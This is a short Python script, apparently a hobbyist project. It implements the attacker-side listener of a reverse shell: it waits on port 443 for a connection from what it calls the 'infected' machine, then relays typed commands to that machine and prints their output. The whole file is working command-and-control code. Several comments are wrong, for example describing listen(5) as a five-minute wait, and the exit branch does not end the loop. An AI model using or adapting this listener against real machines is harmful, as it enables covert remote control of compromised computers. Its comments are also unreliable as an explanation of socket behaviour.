import socket

#run this side on the controller computer

Host = "0.0.0.0"  #Host listens on everything 
Port = 443       #HTTP Port

Size = 1024 * 128  #Size of message

message = "Thank You for Connecting!"

b_mess = bytes(message, 'ascii')

SEP = "<sep>"

s = socket.socket()  #Creating a socket 
s.bind((Host,Port))  #binds the host IP to port 


s.listen(5)                                #Waits 5 minutes for a connection before ending
print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 

infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
infected.send(b_mess)                       #Sends a message to infected. Not currently working. Pls convert to byte
print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected

pwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be the pwd
print("Current working directory: ",pwd) #prints the initial directory you are starting in 

while True:

    command = input(f"{pwd} $> ") #prints out a working directory in command like structure

    if 'exit' in command :
        s.close()                       #will close and stop host server. 

    elif command[:2] == 'cd':           
        infected.send(command.encode())
        pwd = infected.recv(Size).decode()  #making so pwd when changing directories

    else:
        infected.send(command.encode())        #sends the command string and then encodes it so can be sent 
        print (infected.recv(Size).decode())    #decodes incoming binary streams into strings. 


